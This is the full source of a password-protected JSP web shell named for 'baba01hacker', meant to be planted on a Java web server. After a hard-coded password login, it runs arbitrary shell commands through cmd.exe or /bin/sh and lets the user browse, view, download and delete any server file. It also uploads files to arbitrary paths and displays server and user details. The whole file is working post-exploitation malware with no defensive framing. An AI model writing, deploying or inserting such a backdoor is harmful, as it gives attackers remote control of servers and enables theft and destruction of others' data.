<%@ page import="java.io.*,java.util.*,javax.servlet.http.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // ================== CONFIG ==================
    private static final String PASSWORD = "baba01hacker";  // Change this!
    
    public String executeCommand(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = System.getProperty("os.name").toLowerCase().contains("win") ?
                Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd}) :
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});

            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            reader.close();

            reader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = reader.readLine()) != null) output.append("[ERR] ").append(line).append("\n");
            reader.close();
        } catch (Exception e) {
            output.append("Exception: ").append(e.toString());
        }
        return output.toString();
    }

    public String listDirectory(String path) {
        StringBuilder sb = new StringBuilder();
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return "<pre style='color:red'>[-] Path not found or not a directory</pre>";
        }
        sb.append("<table border='1' style='width:100%; border-collapse:collapse;'>");
        sb.append("<tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr>");

        File[] files = dir.listFiles();
        if (files != null) {
            Arrays.sort(files, (a,b) -> a.getName().compareToIgnoreCase(b.getName()));
            for (File f : files) {
                String absPath = f.getAbsolutePath().replace("\\", "/");
                String name = f.getName();
                String size = f.isDirectory() ? "[DIR]" : (f.length()/1024) + " KB";
                String mod = new java.util.Date(f.lastModified()).toString();
                
                sb.append("<tr>");
                sb.append("<td>").append(name).append("</td>");
                sb.append("<td>").append(size).append("</td>");
                sb.append("<td>").append(mod).append("</td>");
                sb.append("<td>");
                sb.append("<a href='?action=download&path=").append(java.net.URLEncoder.encode(absPath,"UTF-8")).append("'>[Down]</a> ");
                sb.append("<a href='?action=delete&path=").append(java.net.URLEncoder.encode(absPath,"UTF-8")).append("' onclick='return confirm(\"Delete?\")'>[Del]</a>");
                if (!f.isDirectory()) {
                    sb.append(" <a href='?action=view&path=").append(java.net.URLEncoder.encode(absPath,"UTF-8")).append("'>[View]</a>");
                }
                sb.append("</td></tr>");
            }
        }
        sb.append("</table>");
        return sb.toString();
    }
%>
<%
    // ============== AUTH ==============
    String passParam = request.getParameter("pass");
    HttpSession sess = request.getSession();
    boolean authenticated = Boolean.TRUE.equals(sess.getAttribute("authenticated"));

    if (passParam != null) {
        if (PASSWORD.equals(passParam)) {
            sess.setAttribute("authenticated", true);
            authenticated = true;
        } else {
            out.println("<h3 style='color:red'>Wrong Password</h3>");
        }
    }

    if (!authenticated) {
%>
        <h2>JSP Webshell - Login</h2>
        <form method="post">
            Password: <input type="password" name="pass" autofocus>
            <input type="submit" value="Login">
        </form>
<%
        return;
    }
%>

<html>
<head>
    <title>JSP Webshell - baba01hacker</title>
    <style>
        body {font-family:monospace; background:#000; color:#0f0; padding:15px;}
        pre, table {background:#111; padding:8px; border:1px solid #0f0;}
        input, textarea {background:#222; color:#0f0; border:1px solid #0f0;}
        a {color:#0ff;}
    </style>
</head>
<body>
<h2>JSP Webshell + File Browser [Authenticated]</h2>
<a href="?logout=1">Logout</a><br><br>

<!-- Command -->
<form method="post">
    <b>Cmd:</b> <input type="text" name="cmd" size="80" value="<%= request.getParameter("cmd")!=null?request.getParameter("cmd"):"id" %>">
    <input type="submit" value="Exec">
</form>

<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        out.println("<pre>" + executeCommand(cmd) + "</pre>");
    }

    // Logout
    if ("1".equals(request.getParameter("logout"))) {
        sess.invalidate();
        response.sendRedirect(request.getRequestURI());
    }

    // File Actions
    String action = request.getParameter("action");
    String fpath = request.getParameter("path");

    if ("download".equals(action) && fpath != null) {
        File file = new File(fpath);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buf = new byte[8192];
                int len;
                while ((len = fis.read(buf)) > 0) {
                    response.getOutputStream().write(buf, 0, len);
                }
            }
            return;
        }
    }

    if ("delete".equals(action) && fpath != null) {
        File file = new File(fpath);
        if (file.delete()) {
            out.println("<pre style='color:yellow'>[+] Deleted: " + fpath + "</pre>");
        } else {
            out.println("<pre style='color:red'>[-] Delete failed</pre>");
        }
    }

    if ("view".equals(action) && fpath != null) {
        File file = new File(fpath);
        if (file.isFile()) {
            out.println("<pre style='white-space:pre-wrap;'>");
            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = br.readLine()) != null) {
                    out.println(line);
                }
            } catch (Exception e) {
                out.println("Cannot read file: " + e.toString());
            }
            out.println("</pre>");
        }
    }
%>

<!-- Upload -->
<form method="post" enctype="multipart/form-data">
    <b>Upload:</b> <input type="file" name="file">
    <input type="text" name="upath" size="50" placeholder="Target full path (optional)">
    <input type="submit" value="Upload">
</form>

<%
    if ("POST".equalsIgnoreCase(request.getMethod()) && request.getPart("file") != null) {
        try {
            Part part = request.getPart("file");
            String fname = part.getSubmittedFileName();
            String target = request.getParameter("upath");
            if (target == null || target.trim().isEmpty()) {
                target = application.getRealPath("/") + "/" + fname;
            }
            InputStream is = part.getInputStream();
            FileOutputStream fos = new FileOutputStream(target);
            byte[] buf = new byte[8192];
            int len;
            while ((len = is.read(buf)) > 0) fos.write(buf, 0, len);
            fos.close(); is.close();
            out.println("<pre style='color:yellow'>[+] Uploaded: " + target + "</pre>");
        } catch (Exception e) {
            out.println("<pre style='color:red'>[-] Upload error: " + e.toString() + "</pre>");
        }
    }
%>

<hr>
<!-- File Browser -->
<form method="get">
    <b>Path:</b> <input type="text" name="dir" size="70" value="<%= request.getParameter("dir")!=null ? request.getParameter("dir") : application.getRealPath("/") %>">
    <input type="submit" value="Browse">
</form>

<%
    String currentDir = request.getParameter("dir");
    if (currentDir == null || currentDir.trim().isEmpty()) {
        currentDir = application.getRealPath("/");
    }
    out.println("<h3>Directory: " + currentDir + "</h3>");
    out.println(listDirectory(currentDir));
%>

<pre>
<b>Server:</b> <%= application.getServerInfo() %> | Java <%= System.getProperty("java.version") %> | <%= System.getProperty("user.name") %>
</pre>
</body>
</html>
